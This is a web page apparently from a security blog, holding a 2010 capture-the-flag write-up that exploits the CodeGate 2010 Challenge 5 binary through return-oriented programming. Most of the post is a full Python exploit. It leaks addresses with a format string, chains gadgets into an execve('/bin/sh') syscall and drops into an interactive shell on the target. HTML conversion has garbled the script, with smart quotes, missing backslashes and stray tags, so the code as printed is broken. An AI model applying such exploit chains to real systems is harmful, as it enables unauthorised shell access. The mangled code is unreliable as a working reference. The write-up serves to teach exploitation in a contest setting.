<!DOCTYPE html>
<html>
    <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width initial-scale=1">

  <title>Return-oriented-programming practice: exploiting CodeGate 2010 Challenge 5</title>
  <meta name="description" content="In my previous post about CodeGate 2010 Challenge 5 exploit, I mentioned the weakness of accessing server to get execl() address. In this post I will show ho...">
  <link rel="stylesheet" href="/assets/bootstrap.css">
  <link rel="stylesheet" href="/assets/main.css">
  <link rel="canonical" href="http://localhost:8000/ctf%20-%20clgt%20crew/2010/04/18/return-oriented-programming-practice-exploiting-codegate-2010-challenge-5.html">
  <link rel="alternate" type="application/atom+xml" title="VNSecurity" href="http://localhost:8000/feed.xml" />
  <script type="text/javascript" src='//ajax.googleapis.com/ajax/libs/webfont/1.4.7/webfont.js?ver=3.9.2'></script>
  <script type="text/javascript" src="/assets/jquery.js"></script>
  <script type="text/javascript" src="/assets/jquery.caroufredsel-6.0.4-packed.js"></script>
  <script type="text/javascript">
    // WebFont.load({
    //     google: {
    //         families: ['Source+Sans+Pro','Open+Sans::latin,vietnamese']
    //     }
    // });
  </script>
</head>

    <body>
        <div class="wrapper kopa-shadow">
            <div class="row-fluid">
                <header id="page-header">
    <div class="clearfix" id="header-top">

        <div class="kp-headline-wrapper clearfix">
            <h6 class="kp-headline-title">Breaking news<span></span></h6>
            <div class="kp-headline clearfix">
                <dl class="ticker-1 clearfix">
                    
                    <dd>
                        <a href="/headlines/2014/05/06/btalk-part-1.html">Phân tích ứng dụng Btalk trên Android &#8211; Phần một: Cơ chế xác thực người dùng</a>
                    </dd>
                    
                    <dd>
                        <a href="/headlines/2011/12/20/hoc-vien-sans-den-viet-nam.html">Học viện SANS đến Việt Nam 03/2012</a>
                    </dd>
                    
                    <dd>
                        <a href="/headlines/2011/12/16/hoi-thao-tet-2012.html">Hội thảo Tết 2012</a>
                    </dd>
                    
                </dl><!--ticker-1-->
            </div><!--kp-headline-->
        </div><!--kp-headline-wrapper-->

        <div class="social-search-box">

        </div>
        <!--social-search-box-->

    </div>
    <!--header-top-->

    <div class="clearfix" id="header-middle">
        <div id="logo-image">
            <a href="http://vnsec-new.cloudapp.net/wp">
                <img width="217" height="70" alt="VNSecurity Logo" src="/assets/logo.png">
            </a>
        </div>
        <div class="top-banner">


        </div>
        <!--top-banner-->

    </div>

    <!--header-middle-->

    <div id="header-bottom">
        <nav id="main-nav">
            <ul class="menu clearfix sf-js-enabled sf-arrows" id="main-menu">
                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                    <a href="/">Home</a>
                </li>
                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                |
                </li>
                
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                        <a href="/category/headlines/">headlines</a>
                    </li>
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                    |
                    </li>
                
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                        <a href="/category/tutorials/">tutorials</a>
                    </li>
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                    |
                    </li>
                
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                        <a href="/category/research/">research</a>
                    </li>
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                    |
                    </li>
                
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                        <a href="/category/ctf-clgt-crew/">ctf - clgt crew</a>
                    </li>
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                    |
                    </li>
                
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                        <a href="/category/misc/">misc</a>
                    </li>
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                    |
                    </li>
                
                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                    <a href="/papers.html">Papers</a>
                </li>
                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                |
                </li>                
                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                    <a href="/tools.html">Tools</a>
                </li>
            </ul>
        </nav>
        <!--main-nav-->
    </div>
    <div>
        
    </div>
    <!--header-bottom-->
</header>
                <div id="main-content">
                    <div class="post type-post status-publish format-standard hentry category-tin-tuc tag-android tag-btalk tag-mobile entry-box clearfix">

  <header class="post-header">
    <h4 class="entry-title">Return-oriented-programming practice: exploiting CodeGate 2010 Challenge 5</h4>
    <p class="post-meta">Apr 18, 2010 • longld</p>
  </header>

  <article class="post-content">
    <p>In my <a href="http://www.vnsecurity.net/2010/03/codegate-2010-online-ctf-challenge-4-5-writeup/" target="_blank">previous post</a> about CodeGate 2010 Challenge 5 exploit, I mentioned the weakness of accessing server to get <em>execl()</em> address. In this post I will show how to blindly exploit the “harder” program without access to the remote server using <a href="http://en.wikipedia.org/wiki/Return-oriented_programming" target="_blank">return-oriented-programming</a> technique.</p>

<h2 id="rop-introduction">ROP introduction</h2>

<p>A worth to read post about ROP introduction can be found on Zynamics blog: <a href="http://blog.zynamics.com/2010/03/12/a-gentle-introduction-to-return-oriented-programming/" target="_blank">http://blog.zynamics.com/2010/03/12/a-gentle-introduction-to-return-oriented-programming/</a></p>

<p>In summary: we will use return-into-instructions (called gadgets) to build and execute our payload when controlled EIP and ESP from vulnerable program.</p>

<p>ROP limitations (difficulties):</p>

<ul>
  <li>ASLR: the same as return-into-libc, it’s difficult to locate address of instructions in library (e.g libc)</li>
  <li>ASCII-armor address: with ascii-armor remapping of libraries (e.g libc), addresses will contain NULL byte so chaining return-into-libc calls and ROP is impossible if there’s NULL filter in input</li>
</ul>

<h2 id="the-8220harder8221-case">The “harder” case</h2>

<p>Fortunately, we can blindly exploit the “harder” program using ROP because it provides some “advantages” in code:</p>

<ul>
  <li><em>getline()</em>: can pass NULL byte to input</li>
  <li><em>printf()</em>: can leak runtime memory info (bypass ASLR)</li>
</ul>

<h2 id="finding-rop-gadgets">Finding ROP gadgets</h2>

<p>Our target is to invoke <strong>execve(“/bin/sh”, 0, 0)</strong> syscall, which is equivalent to prepare registers’ value then trigger kernel syscall:</p>

<blockquote>
  <p>eax = 0xb // execve<br />
ebx = address of “/bin/sh”<br />
ecx = 0 // argv<br />
edx = 0 // env</p>
</blockquote>

<p>Searching in harder binary, we found below gadgets:</p>

<ul>
  <li>eax: 
    <pre>80483a4:    58                       pop    %eax
80483a5:    5b                       pop    %ebx
80483a6:    c9                       leave
80483a7:    c3                       ret</pre>
  </li>
  <li>ebx &amp; ecx: 
    <pre>8048634:    59                       pop    %ecx
8048635:    5b                       pop    %ebx
8048636:    c9                       leave
8048637:    c3                       ret</pre>

    <p>“/bin/sh” is placed on target buffer, its address is available by leaking via <em>printf()</em>&lt;/li&gt; &lt;/ul&gt; 
*   edx:<br />
    There’s no edx related gadget but observing that when returned from <em>memcpy()</em> edx’s value is set to esi so we can assign esi to 0×0 first then return again to main to nullify edx.&lt;/p&gt; 
    &lt;pre&gt;0x001ba506 :    mov    edx,esi
80485e6:    5e                       pop    %esi
80485e7:    5f                       pop    %edi
80485e8:    5d                       pop    %ebp
80485e9:    c3                       ret&lt;/pre&gt;</p>

    <ul>
      <li>
        <p>syscall:<br />
In recent Linux kernel, syscall is usually performed via linux gate: <strong>call gs:[0x10]</strong>. By return to back to <em>printf()</em> in harder program many times, we can find the offset from <em>getline()</em> to first syscall is 319 bytes.</p>
      </li>
      <li>
        <p>moving stack:<br />
After <strong>“leave; ret”</strong> our stack will be moved to new location pointing by ebp. We can control this by set ebp back to somewhere in the middle of target buffer.</p>
      </li>
    </ul>

    <h2 id="exploit-code">Exploit code</h2>

    <pre class="brush: python; title: ; notranslate" title="">#!/usr/bin/env python

</pre>
  </li>
</ul>
<p>import socket
import sys
import struct
import telnetlib</p>

<h1 id="host--ctf4codegateorg">host = ‘ctf4.codegate.org’</h1>
<p>host = ‘127.0.0.1’
port = 9005</p>

<p>c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.connect((host, port))</p>

<p>buf=””
# bypass first read
buf = c.recv(1024)</p>

<h1 id="getline-address">getline() address</h1>
<p>buf = “A”*268 + struct.pack(‘i’, 0x08048524) + struct.pack(‘i’, 0x0804a008) + “n”
c.send(buf)
buf = c.recv(1024)
addr = “”
getline_addr = int(buf[:4][::-1].encode(‘hex’), 16)
print “getline() is at:”, hex(getline_addr)</p>

<h1 id="call-gs0x10-address">call gs:[0x10] address</h1>
<p>offset = 319 # first offset is 319 bytes from getline()
syscall_addr = getline_addr + offset</p>

<h1 id="buffer-address">buffer address</h1>
<p>buf = “%7$x” + “x00”<em>260 + struct.pack(‘i’, 0x08048521)</em>2 + “n”
c.send(buf)
buf = c.recv(1024)
input_addr = int(buf[:8], 16)
print “Buffer address is at: “, hex(input_addr)</p>

<h1 id="gadgets-address">gadgets address</h1>
<p>pop_eax = 0x080483a4
pop_ecx_ebx = 0x08048634
pop_esi = 0x080485e6</p>

<h1 id="pop-esi">pop esi</h1>
<p>buf = “A”<em>268 + struct.pack(‘i’, pop_esi) + “x00” * 12 + struct.pack(‘i’, 0x08048524)</em>2  + “n”
c.send(buf)
c.recv(1024)</p>

<h1 id="pop-eax-then-move-stack-to-new-address">pop eax then move stack to new address</h1>
<p>input_addr += 560 # lifting after 2 getline() calls
new_stack = input_addr+8
buf = “/bin/shx00” # /bin/sh
buf += struct.pack(‘i’, new_stack+16) # next ebp after leave from pop_eax
buf += struct.pack(‘i’, pop_ecx_ebx) # next is pop_ecx_ebx
buf += “x00”<em>4 # ecx
buf += struct.pack(‘i’, input_addr) # ebx -&gt; /bin/sh
buf += “A”</em>4 # un-used ebp after leave from pop_ecx_ebx
buf += struct.pack(‘i’, syscall_addr)
buf = buf.ljust(264, “A”) # padding
buf += struct.pack(‘i’, new_stack) # new ebp
buf += struct.pack(‘i’, pop_eax)
buf += “x0bx00x00x00” # execve syscal
buf += “A”*4 # un-used ebx
buf += “n”</p>

<p>print “Sending final payload …”
c.send(buf)
c.send(“id 2&gt;&amp;1” + “n”*5)</p>

<p>t = telnetlib.Telnet()
t.sock = c
t.interact()
c.close()</p>

<p>&lt;/pre&gt;</p>

  </article>

</div>

<hr/>
<h2>Comments</h2>
<div class="fb-comments" data-href="http://localhost:8000/ctf%20-%20clgt%20crew/2010/04/18/return-oriented-programming-practice-exploiting-codegate-2010-challenge-5.html" data-num-posts="4" data-width="706"></div>

                </div>
                <script type="text/javascript">
jQuery(function() {
    var _scroll = {
        delay: 1000,
        easing: 'linear',
        items: 1,
        duration: 0.07,
        timeoutDuration: 0,
        pauseOnHover: 'immediate'
    };
    jQuery('.ticker-1').carouFredSel({
        width: 1000,
        align: false,
        items: {
            width: 'variable',
            height: 40,
            visible: 1
        },
        scroll: _scroll
    });

    //  set carousels to be 100% wide
    jQuery('.caroufredsel_wrapper').css('width', '100%');
});
</script>
<script>
  (function() {
    var cx = '003844801333820630405:hlapfwpe2eq';
    var gcse = document.createElement('script');
    gcse.type = 'text/javascript';
    gcse.async = true;
    gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
        '//www.google.com/cse/cse.js?cx=' + cx;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(gcse, s);
  })();
</script>
<gcse:search></gcse:search>
<footer class="site-footer">

  <div class="wrapper">

    <div class="footer-col-wrapper">
      
    </div>

  </div>

</footer>

            </div>
        </div>
        <script>(function(d, s, id) {
          var js, fjs = d.getElementsByTagName(s)[0];
          if (d.getElementById(id)) return;
          js = d.createElement(s); js.id = id;
          js.src = "//connect.facebook.net/en_GB/all.js#xfbml=1&appId=671572696275219";
          fjs.parentNode.insertBefore(js, fjs);
        }(document, "script", "facebook-jssdk"));</script>
    </body>
</html>